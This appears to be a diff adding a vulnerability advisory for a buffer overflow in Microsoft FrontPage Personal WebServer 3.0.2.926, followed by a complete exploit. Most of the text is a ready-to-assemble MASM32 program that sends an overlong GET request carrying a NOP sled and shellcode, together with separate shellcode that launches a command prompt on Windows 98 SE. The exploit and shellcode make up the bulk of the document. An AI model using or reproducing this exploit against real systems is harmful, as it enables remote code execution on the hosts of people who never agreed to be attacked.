@@ -1,0 +1,215 @@
+Abstract: 
+ Microsoft FrontPage Personal WebServer [ver 3.0.2.926] is vulnerable to
+a buffer overflow allowing for remote arbitrary code execution.
+ 
+Description: 
+ When a malicious user makes a GET request using an overly long string,
+a buffer overflow occurs due to insufficient bounds checking on the 'GET'
+requests input buffer. 
+
+Analysis:  
+ The buffer overflow condition occurs when a malicious user makes a 'GET'
+request with more than 235 bytes. The RetAddr is overwritten at bytes 236-239.
+This is due to insufficient bounds checking on the 'GET' request.
+
+ It is worth mentioning that after adjustment of additional server settings
+the Offset in which the EIP was overwritten changed to 214 Bytes. 
+
+ An exploit is attached which demonstrates the attack by redirecting the 
+webserver to create a command prompt locally on the attacked system. This
+has been tested under Microsoft Windows 98 SE. For details of the payload,
+please see the attached shellcode.
+ 
+Detection:
+ Microsoft FrontPage Personal WebServer [ver 3.0.2.926] and prior are known
+to be vulnerable. This version is bundled on the Microsoft frontpage 97 install
+CD.
+
+Workaround: 
+ It is recommended applying the fix or updating to a later version.
+
+---------------------------------[EXPLOIT BEGIN]---------------------------------------
+;#   Tested on: Microsoft FrontPage Personal WebServer [ver 3.0.2.926]
+;# Description: Boundary Checking Error 
+;#      Bug ID: 113
+;# Description: A 'GET' request for a URL longer than 166 characters will 
+;#              overflow a buffer and cause the web server to crash. This
+;#              overflow is remotley exploitable to perform arbitrary code 
+;#              execution. 
+;# 
+;#              The shellcode in this exploit creates a local command
+;#              prompt on the exploited box, assuming a kernel base of
+;#              0xBFF70000 (Win98 SE).
+;#
+;#              A second offset can be found in the comments at the end of 
+;#              this file.
+;#
+;#              Coded in MASM32.
+.386
+.model flat,stdcall
+option casemap: none
+
+include \masm32\include\windows.inc
+include \masm32\include\masm32.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\wsock32.inc
+includelib \masm32\lib\masm32.lib
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\wsock32.lib
+
+.data
+  host db 0
+  info db "Remote Microsoft FrontPage Personal WebServer [ver 3.0.2.926] Exploit",13,10
+       db "Win98 SE [Kernel Base]: 0xBFF70000 [Type]: Code Execution",13,10,13,10
+       db "Please input a host in IP format (x.x.x.x) e.g 127.0.0.1",13,10,0
+  port dd 80
+sploit db "GET //////////////////////////////////////////////////////////////////"
+       db "//////////////////////////////////////////////////////////////////////"
+       db "//////////////////////////////////////////////////////////////////////"
+       db "/////////////////////////////"
+       db 064h, 078h, 03Eh, 001h, 062h, 0B9h, 0F9h, 0BFh, 090h, 090h, 090h, 090h
+       db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+       db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+       db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+       db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+       db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
+       db 089h, 0E5h, 031h, 0C0h, 050h, 0B0h, 005h, 050h, 031h, 0C0h, 050h, 0C6h
+       db 045h, 0F4h, 043h, 0C6h, 045h, 0F5h, 04Fh, 0C6h, 045h, 0F6h, 04Dh, 0C6h
+       db 045h, 0F7h, 04Dh, 0C6h, 045h, 0F8h, 041h, 0C6h, 045h, 0F9h, 04Eh, 0C6h
+       db 045h, 0FAh, 044h, 0C6h, 045h, 0FBh, 02Eh, 0C6h, 045h, 0FCh, 043h, 0C6h
+       db 045h, 0FDh, 04Fh, 0C6h, 045h, 0FEh, 04Dh, 08Dh, 075h, 0F4h, 031h, 0C0h
+       db 0B0h, 005h, 050h, 056h, 0BAh, 0FFh, 0FFh, 0FFh, 0FFh, 0B8h, 057h, 0F2h
+       db 005h, 040h, 029h, 0C2h, 0FFh, 0D2h, 031h, 0D2h, 052h, 0BAh, 0F8h, 0D4h
+       db 0F8h, 0BFh, 0FFh, 0D2h,13,10,0
+  sock dd ?
+  
+sploitlen equ $-sploit
+bufflen equ $-host
+
+wsadescription equ 256
+wsasystatus equ 128
+
+WSAData struct
+wVersion     dw ?
+wHighVersion dw ?
+szDescritpion  equ wsadescription+1 dup(?)
+szSystemStatus equ wsasystatus+1    dup(?)
+iMaxSockets  dw ?
+iMaxUdpDg    dw ?
+lpVendorInfo dw ?
+WSAData ends
+wsadata WSAData <?>
+
+sin_sockaddr_in struct
+sin_family dw ?
+  sin_port dw ?
+  sin_addr dd ? 
+  sin_zero db 8 dup(0)
+sin_sockaddr_in ends
+sin sin_sockaddr_in <?>
+
+.code
+start:
+      call AllocConsole
+      push offset info
+      call StdOut
+      push bufflen
+      push offset host
+      call StdIn
+      call FreeConsole
+      push offset wsadata
+      mov eax,0101h
+      push eax
+      call WSAStartup
+      xor eax,eax 
+      push eax
+      inc eax
+      push eax
+      inc eax
+      push eax
+      call socket
+      mov sock,eax
+      mov sin.sin_family,2
+      push port
+      call htons
+      mov sin.sin_port,ax
+      xor eax,eax
+      push offset host
+      call inet_addr
+      mov sin.sin_addr,eax      
+      push sizeof sin
+      push offset sin
+      push sock
+      call connect
+      xor eax,eax
+      push eax
+      push sploitlen
+      push offset sploit
+      push sock
+      call send
+      push sock      
+      call closesocket
+      call WSACleanup
+      xor eax,eax
+      push eax      
+      call ExitProcess
+end start
+
+;# This is the second offset where the EIP is overwritten. 
+;# 
+;#sploit db "GET //////////////////////////////////////////////////////////////////"
+;#       db "//////////////////////////////////////////////////////////////////////"
+;#       db "//////////////////////////////////////////////////////////////////////"
+;#       db "////////"
+----------------------------------[EXPLOIT END]----------------------------------------
+--------------------------------[SHELLCODE BEGIN]--------------------------------------
+;# PRIVATE !!! PRIVATE !!! PRIVATE !!!
+;# Description: Win 98 SE Local Shellcode
+;#      Result: Executes a command prompt
+;# Kernel base: 0xBFF70000
+;#
+;# This is a complete local shellcode. This shellcode creates a command
+;# prompt via the WinExec function.
+;#
+;# "Oh what a tangled web we weave, when at first we set out to decieve"
+;# PRIVATE !!! PRIVATE !!! PRIVATE !!!
+BITS 32
+ORG 0x0
+   mov ebp,esp                     
+   xor eax,eax                     
+   push eax                        
+   push eax                        
+   push eax                        
+   mov byte [ebp-0Ch],43h          
+   mov byte [ebp-0Bh],4Fh 
+   mov byte [ebp-0Ah],4Dh 
+   mov byte [ebp-09h],4Dh 
+   mov byte [ebp-08h],41h 
+   mov byte [ebp-07h],4Eh 
+   mov byte [ebp-06h],44h 
+   mov byte [ebp-05h],2Eh
+   mov byte [ebp-04h],43h
+   mov byte [ebp-03h],4Fh
+   mov byte [ebp-02h],4Dh
+   lea esi,[ebp-0Ch]
+   xor eax,eax
+   mov al,05h
+   push eax
+   push esi          
+   mov edx,0BFFA0DA8h   
+   call edx
+   xor edx,edx
+   push edx
+   mov edx,0BFF8D4F8h
+   call edx
+
+;# ---- Egg & Play ---- 
+;  db 089h, 0E5h, 031h, 0C0h, 050h, 050h, 050h, 0C6h, 045h, 0F4h, 043h, 0C6h 
+;  db 045h, 0F5h, 04Fh, 0C6h, 045h, 0F6h, 04Dh, 0C6h, 045h, 0F7h, 04Dh, 0C6h
+;  db 045h, 0F8h, 041h, 0C6h, 045h, 0F9h, 04Eh, 0C6h, 045h, 0FAh, 044h, 0C6h
+;  db 045h, 0FBh, 02Eh, 0C6h, 045h, 0FCh, 043h, 0C6h, 045h, 0FDh, 04Fh, 0C6h
+;  db 045h, 0FEh, 04Dh, 08Dh, 075h, 0F4h, 031h, 0C0h, 0B0h, 005h, 050h, 056h
+;  db 0BAh, 0A8h, 00Dh, 0FAh, 0BFh, 0FFh, 0D2h, 031h, 0D2h, 052h, 0BAh, 0F8h
+;  db 0D4h, 0F8h, 0BFh, 0FFh, 0D2h
+;# ---- Egg & Play ---- 
+---------------------------------[SHELLCODE END]---------------------------------------
